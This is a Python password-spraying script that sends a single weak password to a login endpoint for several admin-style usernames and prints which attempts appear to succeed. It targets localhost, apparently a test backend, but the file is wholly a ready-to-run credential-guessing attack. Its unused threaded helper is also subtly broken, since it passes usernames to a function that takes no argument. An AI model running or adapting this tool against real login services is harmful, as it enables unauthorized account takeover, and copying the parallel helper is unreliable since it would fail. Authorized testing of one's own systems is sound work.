import requests
from concurrent.futures import ThreadPoolExecutor

# Set the correct target URL for the login endpoint on your backend
url = "http://localhost:5050/login"

# Define headers (optional)
headers = {
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/json'  # Ensure correct content type
}

# List of usernames for password spraying
usernames = [
    'admin',
    'admin2',
    'admin3',
    'admin4'
]

# The password you want to use for spraying
password = "password"

# Function to perform password spraying
def password_spray():
    for username in usernames:
        # Payload with username and password
        data = {
            'username': username,
            'password': password
        }

        # Send a POST request
        response = requests.post(url, json=data, headers=headers)

        # Print the full response for debugging purposes
        print(response)

        # Check the HTTP status code
        if response.status_code == 200:
            print(f"[+] Successful login with {username}:{password} (Status Code: {response.status_code})")
        elif response.status_code == 302:  # Redirect (could indicate success in some systems)
            print(f"[+] Successful login with {username}:{password} (Redirect to: {response.headers['Location']})")
        elif response.status_code == 401:
            print(f"[-] Failed login for {username} (Status Code: 401 Unauthorized)")
        elif response.status_code == 403:
            print(f"[-] Failed login for {username} (Status Code: 403 Forbidden)")
        else:
            print(f"[-] Failed login for {username} (Status Code: {response.status_code})")

# Function to run password spraying in parallel
def password_spray_parallel():
    # Using ThreadPoolExecutor to manage a pool of threads
    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(password_spray, usernames)

# Run the password spray
if __name__ == "__main__":
    password_spray()
